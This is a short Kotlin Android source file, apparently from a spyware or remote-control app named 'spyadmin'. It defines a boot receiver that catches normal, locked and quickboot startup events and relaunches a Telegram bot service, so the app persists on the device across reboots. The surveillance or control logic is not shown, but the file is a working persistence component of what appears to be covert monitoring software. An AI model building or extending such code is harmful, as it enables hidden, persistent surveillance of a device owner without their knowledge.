package com.spyadmin

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED
            || intent.action == "android.intent.action.QUICKBOOT_POWERON"
            || intent.action == Intent.ACTION_LOCKED_BOOT_COMPLETED
            || intent.action == "android.intent.action.REBOOT") {

            Log.d("AdminBoot", "Boot completed, starting services")
            val botIntent = Intent(context, TelegramBotService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, botIntent)
            } else {
                context.startService(botIntent)
            }
        }
    }
}